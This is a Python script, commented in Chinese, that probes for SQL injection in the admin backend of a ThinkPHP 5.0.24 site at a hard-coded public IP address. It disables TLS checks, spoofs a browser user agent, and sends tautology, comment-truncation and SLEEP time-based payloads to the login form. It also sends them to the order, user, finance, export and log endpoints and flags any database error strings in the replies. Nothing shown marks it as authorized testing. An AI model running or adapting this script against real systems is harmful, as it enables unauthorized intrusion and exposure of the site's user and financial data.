#!/usr/bin/env python3
"""tp_sqli_probe.py - 上量后台TP 5.0.24 SQL注入探测
目标: /admin/login/login.html 登录接口 + 业务接口参数
"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def post(url, data):
    try:
        req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=8, context=ctx)
        return r.status, r.read(30000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(30000).decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)[:150]

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(30000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(30000).decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)[:150]

print("=== 1. 登录接口SQLi探测 ===", flush=True)
for payload in ["admin'", "admin' OR '1'='1", "admin'--", "admin'#", "admin' AND SLEEP(3)--",
                "1' OR 1=1--", "admin' OR '1'='1'--", "admin\\'", "admin' AND 1=1--"]:
    st, b = post(BASE + "/admin/login/login.html", {"name": payload, "pwd": "x", "phone": "15922560065"})
    err = ""
    m = re.search(r"SQLSTATE|syntax error|mysql_|PDO|SQL syntax|You have an error", b, re.I)
    if m: err = m.group(0)
    delay = "SLEEP" if "sleep" in b.lower() else ""
    print("  name=%s -> st=%s resp=%s %s %s" % (payload[:20], st, b[:80], err, delay), flush=True)

print("=== 2. 业务接口GET参数SQLi探测 ===", flush=True)
for url in ["/admin/order/index.html?id=1'", "/admin/order/index.html?id=1 AND SLEEP(3)",
            "/admin/user/index.html?id=1'", "/admin/product/index.html?id=1'",
            "/admin/finance/index.html?id=1'", "/admin/export/export.html?id=1'",
            "/admin/log/index.html?id=1'", "/index.php?m=admin&c=order&a=index&id=1'"]:
    st, b = get(BASE + url)
    m = re.search(r"SQLSTATE|syntax error|mysql_|PDOException|SQL syntax", b, re.I)
    err = m.group(0) if m else ""
    print("  %s -> st=%d size=%d %s" % (url.split("?")[0].split("/")[-1] + "?" + (url.split("?")[1] if "?" in url else ""), st, len(b), err), flush=True)

print("=== 3. 首页/公开接口探测 ===", flush=True)
for p in ["/index.php?s=/index/index/index", "/index.php?s=home/index/index", "/index.php?s=api/index/index",
          "/index.php?s=index/index", "/home/", "/api/", "/index.php?s=captcha",
          "/admin/login/login.html?test=1'", "/index.php?s=admin/login/login&name=admin'"]:
    st, b = get(BASE + p)
    m = re.search(r"SQLSTATE|syntax error|mysql_|PDOException|SQL syntax", b, re.I)
    err = m.group(0) if m else ""
    print("  %s -> st=%d size=%d %s" % (p, st, len(b), err), flush=True)
print("=== DONE ===", flush=True)
